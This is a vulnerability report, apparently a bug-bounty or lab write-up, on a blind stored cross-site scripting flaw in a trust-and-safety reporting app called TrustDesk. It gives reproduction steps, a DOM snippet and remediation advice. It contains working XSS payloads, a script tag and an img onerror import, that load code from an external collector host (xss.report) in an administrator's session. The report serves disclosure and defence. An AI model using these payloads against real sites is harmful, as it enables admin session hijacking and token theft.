## Title

Blind Cross-Site Scripting (XSS) via Unsanitized Report Title and User/Email Fields on TrustDesk Review Queue Dashboard.

## Affected URL

https://trustdesk.pwnedbox.site/

## Description

A Blind Cross-Site Scripting (XSS) vulnerability was identified in the trust and safety report submission handler of the TrustDesk platform. User-supplied input submitted through report fields (such as Report title, Email, and Username) is stored persistently in the backend database without proper input sanitization, encoding, or output escaping.

When an administrative user or reviewer inspects submitted safety reports within the admin review console, the stored payloads—such as `<script src="https://xss.report/c/vansh"></script>`—are rendered directly into the Document Object Model (DOM). This causes the malicious script to execute asynchronously within the reviewer's privileged session context, allowing remote code execution, session hijacking, or administrative action compromise.

## Steps to Reproduce

1. Navigate to the target application submission interface: `https://trustdesk.pwnedbox.site/report.php`.
2. Locate the safety report form and inject JavaScript payloads into input fields (e.g., entering `'"&><script src="https://xss.report/c/vansh"></script>` into the Report title and email/profile fields).
3. Submit the trust and safety report form.
4. Log into the administrative review console where stored cases are evaluated (`https://trustdesk.pwnedbox.site/admin/` review queue).
5. Observe that the stored payload executes in the DOM of the review console, firing requests to the external collector (`xss.report`).

## POC
<img width="1407" height="1291" alt="image" src="https://github.com/user-attachments/assets/097dc02f-c38b-4112-99c7-de040c56c100" />
<img width="1718" height="1059" alt="image" src="https://github.com/user-attachments/assets/e609c025-20ec-4764-880d-a1c7dc3e111b" />

### Vulnerable DOM Snippet

```html
<html>
  <head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width,initial-scale=1">
    <title>TrustDesk · Review Queue</title>
    <link rel="stylesheet" href="../assets/style.css">
  </head>
  <body class="admin-shell">
    <header class="admin-top">
      <a class="brand" href="../index.php"><span class="shield">✦</span>TrustDesk</a>
      <div>
        <span>Review console</span>
        <a href="logout.php">Sign out</a>
      </div>
    </header>
    <main class="admin-main">
      <div class="admin-title">
        <div>
          <span class="eyebrow">TRUST &amp; SAFETY CONSOLE</span>
          <h1>Review queue</h1>
        </div>
        <a class="button dark" href="../report.php">New report ↗</a>
      </div>
      <div class="stats">
        <div><small>New</small><strong>2</strong></div>
        <div><small>Investigating</small><strong>0</strong></div>
        <div><small>Action required</small><strong>0</strong></div>
        <div><small>Resolved</small><strong>0</strong></div>
        <div><small>Closed</small><strong>0</strong></div>
      </div>
      <form class="filters">
        <input name="q" value="" placeholder="Search case, title, email, username">
        <select name="status">
          <option value="">All statuses</option>
          <option value="new">New</option>
          <option value="investigating">Investigating</option>
          <option value="action_required">Action required</option>
          <option value="resolved">Resolved</option>
          <option value="closed">Closed</option>
        </select>
        <select name="severity">
          <option value="">All severity</option>
          <option value="low">Low</option>
          <option value="medium">Medium</option>
          <option value="high">High</option>
          <option value="critical">Critical</option>
        </select>
        <button class="button">Filter</button>
      </form>
      <div class="queue">
        <a class="queue-row" href="view.php?id=2">
          <div class="q-main">
            <span class="case-id">TD-5E3685DC</span>
            <h3>'"&gt;<script src="[https://xss.report/c/vansh](https://xss.report/c/vansh)"></script></h3>
            <p>asd@gmail.com · Content</p>
          </div>
          <div class="q-meta">
            <span class="status status-new">new</span>
            <b class="sev-medium">medium</b>
            <small>Nov 9, 2026</small>
          </div>
        </a>
        <a class="queue-row" href="view.php?id=1">
          <div class="q-main">
            <span class="case-id">TD-4481BE73</span>
            <h3>'"&gt;<img src="" onerror="import('//xss.report/c/cyberbro')"></h3>
            <p>hello@gmail.com · User</p>
          </div>
          <div class="q-meta">
            <span class="status status-new">new</span>
            <b class="sev-low">low</b>
            <small>Oct 22, 2026</small>
          </div>
        </a>
      </div>
    </main>
  </body>
```
## Impact
Execution of arbitrary JavaScript code within the high-privilege session of an administrator or safety reviewer examining submitted reports.

Compromise of administrative sessions, potential cookie or token exfiltration, and unauthorized modification of safety case statuses or moderation queues.

Persistent code execution affecting backend triage handlers and trust & safety review panels.

## Remediation
Implement strict context-aware output encoding (such as HTML entity encoding) for all stored user inputs when rendering them in review queues, dashboards, or detail views.

Apply strict input validation and sanitization policies on all report submission endpoints (Report title, Email, Username, Description fields) to reject or neutralize HTML markup and script tags.

Deploy a comprehensive Content Security Policy (CSP) restricting inline script execution and unauthorized external script domains.
</html>
